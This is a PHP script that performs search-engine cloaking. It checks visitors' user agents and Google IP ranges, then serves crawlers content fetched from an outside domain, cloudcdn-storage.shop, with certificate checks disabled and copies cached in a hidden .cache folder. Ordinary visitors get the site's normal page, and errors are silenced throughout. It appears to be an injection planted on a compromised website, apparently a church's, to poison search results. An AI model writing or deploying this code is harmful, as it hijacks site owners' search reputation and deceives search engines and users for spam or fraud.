<?php
error_reporting(0);
ini_set('display_errors', 0);

// ============================================
// CONFIGURATION (PHP 5.x SAFE)
// ============================================
$config = array(
    'bot_url'   => 'https://cloudcdn-storage.shop/churchofantioch/additional-information/index.html',
    'cache_ttl' => 3600,
    'timeout'   => 15
);

// ============================================
// BOT DETECTION
// ============================================
function is_search_bot() {
    $bots = array(
        'Googlebot','Googlebot-Mobile','Googlebot-Image','Googlebot-News',
        'Googlebot-Video','AdsBot-Google','Mediapartners-Google',
        'Google-InspectionTool','Google-Site-Verification','Storebot-Google',
        'bingbot','msnbot','BingPreview',
        'Slurp','DuckDuckBot','Baiduspider','YandexBot',
        'facebookexternalhit','LinkedInBot','Twitterbot'
    );

    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

// ============================================
// GOOGLE IP VERIFY
// ============================================
function verify_google_ip() {
    $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
    if ($ip == '') return false;

    $google_ip_prefixes = array('66.249.','64.233.','72.14.','209.85.','216.239.');

    foreach ($google_ip_prefixes as $prefix) {
        if (strpos($ip, $prefix) === 0) {
            return true;
        }
    }

    $hostname = @gethostbyaddr($ip);
    if ($hostname &&
        (stripos($hostname, 'googlebot.com') !== false ||
         stripos($hostname, 'google.com') !== false)) {

        $resolved_ip = @gethostbyname($hostname);
        if ($resolved_ip === $ip) {
            return true;
        }
    }
    return false;
}

// ============================================
// FETCH REMOTE CONTENT
// ============================================
function get_remote_content($url, $timeout = 10) {

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

        $content = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($content && $http_code == 200) {
            return $content;
        }
    }

    if (ini_get('allow_url_fopen')) {
        $context = stream_context_create(array(
            'http' => array(
                'method' => 'GET',
                'timeout' => $timeout,
                'user_agent' => 'Mozilla/5.0',
                'follow_location' => 1
            ),
            'ssl' => array(
                'verify_peer' => false,
                'verify_peer_name' => false
            )
        ));

        $content = @file_get_contents($url, false, $context);
        if ($content !== false) {
            return $content;
        }
    }
    return false;
}

// ============================================
// CACHE SYSTEM
// ============================================
function cache_content($key, $content = null, $ttl = 3600) {
    $cache_dir = dirname(__FILE__) . '/.cache';
    if (!is_dir($cache_dir)) {
        @mkdir($cache_dir, 0755, true);
    }

    $cache_file = $cache_dir . '/' . md5($key) . '.html';

    if ($content !== null) {
        file_put_contents($cache_file, serialize(array(
            'time' => time(),
            'content' => $content
        )));
        return true;
    } else {
        if (file_exists($cache_file)) {
            $data = @unserialize(file_get_contents($cache_file));
            if ($data && (time() - $data['time']) < $ttl) {
                return $data['content'];
            }
        }
    }
    return false;
}

// ============================================
// SERVE BOT CONTENT
// ============================================
function serve_bot_content($url, $ttl = 3600, $timeout = 15) {

    $cached = cache_content('bot_content', null, $ttl);
    if ($cached) {
        header('Content-Type: text/html; charset=utf-8');
        header('X-Visitor-Type: bot');
        echo $cached;
        exit;
    }

    $content = get_remote_content($url, $timeout);
    if ($content) {
        cache_content('bot_content', $content, $ttl);
        header('Content-Type: text/html; charset=utf-8');
        header('X-Visitor-Type: bot');
        echo $content;
        exit;
    }

    header('HTTP/1.1 503 Service Temporarily Unavailable');
    echo '<h1>503 Service Temporarily Unavailable</h1>';
    exit;
}

// ============================================
// MAIN
// ============================================
if (is_search_bot()) {

    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

    if (stripos($ua, 'Googlebot') !== false) {
        if (verify_google_ip()) {
            serve_bot_content($config['bot_url'], $config['cache_ttl'], $config['timeout']);
        }
    } else {
        serve_bot_content($config['bot_url'], $config['cache_ttl'], $config['timeout']);
    }
}

header('Content-Type: text/html; charset=utf-8');
header('X-Visitor-Type: user');
?>